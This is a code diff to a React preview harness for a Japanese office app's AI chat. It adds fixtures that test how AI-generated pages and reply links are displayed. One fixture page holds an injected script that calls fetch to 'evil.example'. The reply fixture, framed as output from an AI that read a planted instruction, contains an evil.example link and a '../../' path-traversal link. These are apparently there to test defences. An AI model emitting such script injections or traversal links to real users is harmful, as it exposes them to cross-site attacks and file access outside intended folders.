@@ -23,6 +23,7 @@ import { useAppStore } from '../src/stores/appStore'
 import { useCommandHandler, useKeybindings } from '../src/shared/commands/commands'
 import { ToolRunGroup } from '../src/features/chat/components/ToolRows'
 import { planParts } from '../src/features/chat/toolRows'
+import { MarkdownMessage } from '../src/features/chat/components/MarkdownMessage'
 import type { UIMessage } from 'ai'
 import { hasUnsavedEdits } from '../src/shared/lib/unsavedEdits'
 import { WindowCloseGuard } from '../src/app/WindowCloseGuard'
@@ -55,13 +56,25 @@ const htmlView = params.get('view') === 'html'
 const HTML_DOC = `${ROOT}/営業部/報告/11月の売上.html`
 const TOP_DOC = `${ROOT}/会社案内.html`
 const SLIDES_DOC = `${ROOT}/営業部/報告/提案スライド.html`
+// A page the AI made in the member's 今日のフォルダ (reply-style.ts), linked from its reply (chat's page cards).
+const PAGE_DOC = `${ROOT}/営業部/.personal/inbox/日付別/2026/20261128/ページ/プランの比べ表.html`
 if (htmlView) {
   for (const key of Object.keys(files)) delete files[key]
   files[HTML_DOC] = '<!doctype html><h1>11月の売上</h1><p>売上は前年比 120% でした。</p>'
   files[`${ROOT}/営業部/提案書.md`] = '# 提案書\n\n来期のご提案。'
   files[TOP_DOC] = '<!doctype html><p>会社案内</p>'
   files[SLIDES_DOC] = '<!doctype html><h1>提案スライド</h1>'
+  files[PAGE_DOC] = '<!doctype html><h1>プランの比べ表</h1><script>parent.__pwned = 1; fetch("https://evil.example/x")</script>'
 }
+// The AI's reply text (the AI may have read a planted instruction): two pages of the company folder are cards; a
+// web address, a file outside the company folder, a climb, the top level and a Markdown file stay ordinary links.
+const REPLY_TEXT = [
+  `プランを比べるページを作りました。[プランの比べ表](${encodeURI(PAGE_DOC)})`,
+  '',
+  '先月の報告はこちら：[11月の売上](営業部/報告/11月の売上.html)',
+  '',
+  '[ネットの表](https://evil.example/営業部/x.html) [よそ](/tmp/よそ.html) [上へ](営業部/../../x.html) [会社案内](会社案内.html) [提案書](営業部/提案書.md)',
+].join('\n')
 // The AI's lines of one reply: an HTML file written in the company folder (［見る］), one read, a
 // Markdown file written, an HTML file written outside the company folder, a write that failed.
 const toolPart = (id: string, toolName: string, input: unknown, state = 'output-available') =>
@@ -240,6 +253,11 @@ export function Preview() {
       {htmlView && (
         <section aria-label="AI の作業" className="w-[760px] px-3 py-2">
           {CHAT_LINES.map(item => (item.kind === 'run' ? <ToolRunGroup key={item.key} item={item} /> : null))}
+        </section>
+      )}
+      {htmlView && (
+        <section aria-label="AI の返事" className="w-[760px] px-3 py-2">
+          <MarkdownMessage content={REPLY_TEXT} />
         </section>
       )}
       <WindowCloseGuard />
